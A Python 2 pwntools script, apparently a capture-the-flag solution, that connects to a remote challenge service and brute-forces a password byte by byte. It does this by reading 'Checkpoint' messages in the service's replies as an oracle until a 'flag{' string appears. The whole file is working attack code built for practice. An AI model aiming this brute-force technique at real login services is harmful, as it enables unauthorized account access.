from binascii import unhexlify
from pwn import *
import struct


def checkErrors(str):
    if ('flag{' in str):
        #print str
        print "Exploit works, Flag found!!"
        return 10
    if ('OOPS' in str):
        return 0
    if ('Checkpoint' in str):
        #print "-------------------------------------------------------------------"
        #print str
        str = str[str.find('Checkpoint')+10:]
        #print str
        if ('Checkpoint' in str):
            #print "--->yeahh"
            return 1
    return 2


def exploit(username, password):

    #p = process('./bin/step6')
    p = remote( "dumbistan.life", 50060)

    recv1 = p.recv()
    #print recv1

    p.sendline('1')


    totalCommunication = recv1


    index = 0
    while True:
        try:
            if (index == 0):
                p.sendline(username)
            elif (index == 1):
                p.sendline(password)
            elif (index == 2):
                p.sendline("2")
                #print "2 sent"
            elif (index == 3):
                p.sendline('9')


            recv = p.recv()

            totalCommunication += recv
            #print totalCommunication
            errCode = checkErrors(totalCommunication)
            if (errCode == 0):
                print "False-> close"
                p.close()
                print totalCommunication
                break
            elif (errCode == 1):
                p.close()
                break
            elif (errCode == 10):
                print totalCommunication
                return True
                sys.exit(0)
        except EOFError:
            print totalCommunication
            print "----> Connection closed" + str(index)
            sys.exit(0)

        index += 1
    return False

# exploit("dumb\x0a", "super_huge_and_secure_password\x0a")
# exploit(chr(0), chr(202))
#

def bruteforce (pw):
    for i1 in range(80, 256):
        # print "chr(215) + chr(i1)"
        if (exploit(chr(41), pw + chr(i1))):
            #print "username: " + str(41) + "; password: " + str(i1)
            return i1

pw = ""
lettercounter = 0
while True:
    number = bruteforce(pw)
    number -= 59
    pw += chr(number)
    print "------------------------------------------------------------------------------------------------------------------------------> " + pw
    lettercounter+=1
    if (lettercounter == 40) or (chr(number) == '}'):
        sys.exit(0)





